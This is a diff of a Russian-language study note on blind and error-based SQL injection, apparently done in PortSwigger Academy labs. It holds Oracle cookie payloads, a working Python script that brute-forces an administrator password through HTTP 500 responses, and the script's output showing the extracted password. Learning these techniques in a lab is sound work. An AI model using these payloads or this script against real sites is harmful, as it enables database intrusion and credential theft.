@@ -1,9 +1,12 @@
 [[0Определение SQL Injection]] - карта раздела
 ## Оглавление
+
 [[#Определение]]
 [[#Эксплуатация]]
 [[#Пример в лабе]]
 [[#Решение более сложного примера]]
+[[#Пример эксплоита для перебора]] 
+[[#Извлечение данных с помощью подробных сообщений об ошибках в SQL]]
 
 ---
 #### Определение
@@ -39,6 +42,8 @@ xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a #2 запрос
 xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password,1,1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
 ```
 
+
+---
 #### Решение более сложного примера
 В этом примере у на приложение уязвимо для инъекции через параметр tracking-Id пробуем его поменять чтобы найти ошибки: 
 > [!example] 
@@ -77,5 +82,98 @@ TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual
 ```
 теперь надо составить для таблицы `users` пользователя `administrator` и строчек `user` и `password` при этом чтобы условие работало и не вызывало ошибок
 ```
-
+TrackingId=xyz'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' - не вызывает ошибок
 ```
+теперь можно пробовать переходить непосредственно к самому паролю, я попробую прописать через substr таким образом чтобы при правильном символе вызывалась 500 ошибка
+```
+TrackingId=xyz'||(SELECT CASE WHEN (SUBSTR(password,1,1)>'a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' 
+```
+для проверки я ставил знаки больше или меньше потому что одни 100% должен дать ошибку если мой запрос корректен, и действительно в моем случае 500 дал знак `<`, следовательно запрос валиден и пишем программу на питоне
+
+#### Пример эксплоита для перебора
+
+> [!exploit] 
+```python
+import requests
+import string
+
+targ_url = "https://0ac100c504f6a7998011080b00e300f6.web-security-academy.net"
+tracking = "QYapmBM3Z2PmUZJ6"
+session = "lwyr18qFxj1i4BMJ1nfGUuy0BeIhYwAe"
+possible_chars = string.ascii_letters+string.digits
+extracted_password = ""
+
+def check_char(position, char):
+    payload = f"'||(SELECT CASE WHEN SUBSTR(password,{position},1)='{char}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
+    injected_cookie = tracking + payload
+    cookies = {
+        "TrackingId": injected_cookie,
+        "session": session
+    }
+
+    response = requests.get(targ_url, cookies=cookies)
+    return response.status_code == 500
+
+def exploit():
+    global extracted_password
+    print("[*] Starting blind SQL injection...")
+
+    for i in range(1, 100):  
+        for char in possible_chars:
+            if check_char(i, char):
+                extracted_password += char
+                print(f"[+] Found character {i}: {char} -> {extracted_password}")
+                break
+        else:
+            print(f"[-] No match found at position {i}. Ending.")
+            break
+
+    print(f"[*] Extraction complete. Password: {extracted_password}")
+
+if __name__ == "__main__":
+    exploit()
+```
+и вот такой результат я получил 
+```
+[*] Starting blind SQL injection...
+[+] Found character 1: 6 -> 6
+[+] Found character 2: w -> 6w
+[+] Found character 3: t -> 6wt
+[+] Found character 4: 1 -> 6wt1
+[+] Found character 5: e -> 6wt1e
+[+] Found character 6: h -> 6wt1eh
+[+] Found character 7: m -> 6wt1ehm
+[+] Found character 8: w -> 6wt1ehmw
+[+] Found character 9: 7 -> 6wt1ehmw7
+[+] Found character 10: v -> 6wt1ehmw7v
+[+] Found character 11: o -> 6wt1ehmw7vo
+[+] Found character 12: e -> 6wt1ehmw7voe
+[+] Found character 13: a -> 6wt1ehmw7voea
+[+] Found character 14: 4 -> 6wt1ehmw7voea4
+[+] Found character 15: z -> 6wt1ehmw7voea4z
+[+] Found character 16: u -> 6wt1ehmw7voea4zu
+[+] Found character 17: w -> 6wt1ehmw7voea4zuw
+[+] Found character 18: c -> 6wt1ehmw7voea4zuwc
+[+] Found character 19: h -> 6wt1ehmw7voea4zuwch
+[+] Found character 20: l -> 6wt1ehmw7voea4zuwchl
+[*] Extraction complete. Password: 6wt1ehmw7voea4zuwchl
+```
+
+#### Извлечение данных с помощью подробных сообщений об ошибках в SQL
+
+Неправильная ошибка конфигурации приводит к появлению подробной информации о SQL ошибках, сами ошибки могут содержать полезную информацию, пример: 
+```
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char
+```
+Здесь выводится полный запрос с использованием наших входных данных, мы видим что в данном случае мы вводим строчку в одинарных кавычках внутри `Where`
+Иногда мы можем заставить приложение сгенерировать сообщение об ошибке содержащее некоторые данные возвращаемые запросом, по факту это превращает которая была бы скрыта при внедрении вслепую 
+Для исполнения такой инъекции мы можем использовать функцию `CAST()` которая позволяет преобразовывать один тип данных в другой
+Например: 
+```
+CAST((SELECT example_column FROM example_table) AS int)
+```
+Часто данные для чтения это строка, попытка преобразовать их в несовместимы тип данных приводит к ошибке: 
+```
+ERROR: invalid input syntax for type integer: "Example data"
+```
+Это так же может быть полезно если ограничение по количеству символов не позволяет запускать условные ответы(те которые мы используем когда перебираем вслепую)
